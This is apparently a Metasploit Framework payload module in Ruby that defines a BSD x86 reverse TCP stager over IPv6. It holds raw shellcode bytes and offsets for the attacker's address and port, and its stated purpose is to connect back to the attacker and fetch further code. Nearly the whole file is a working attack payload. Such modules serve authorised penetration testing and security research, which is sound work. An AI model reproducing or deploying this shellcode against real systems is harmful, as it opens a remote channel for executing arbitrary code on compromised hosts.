##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'


###
#
# ReverseTcp
# ----------
#
# BSD reverse TCP stager.
#
###
module MetasploitModule

  CachedSize = 81

  include Msf::Payload::Stager


  def self.handler_type_alias
    "reverse_ipv6_tcp"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager (IPv6)',
      'Description'   => 'Connect back to the attacker over IPv6',
      'Author'        =>  ['skape', 'vlad902', 'hdm'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsd',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LHOST'    => [ 42, 'ADDR6' ],
              'LPORT'    => [ 36, 'n'    ],
              'SCOPEID'  => [ 58, 'V'    ]
            },
          'Payload' =>
            "\x31\xc0\x50\x40\x50\x6a\x1c\x6a\x61\x58\x50\xcd\x80\xeb\x0e\x59" +
            "\x6a\x1c\x51\x50\x97\x6a\x62\x58\x50\xcd\x80\xeb\x21\xe8\xed\xff" +
            "\xff\xff\x1c\x1c\xbf\xbf\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x6a\x10" +
            "\x5a\xc1\xe2\x08\x29\xd4\x89\xe1\x52\x51\x57\x51\xb0\x03\xcd\x80" +
            "\xc3"
        }
      ))
    register_options([
      OptInt.new('SCOPEID', [false, "IPv6 scope ID, for link-local addresses", 0])
    ])
  end
end
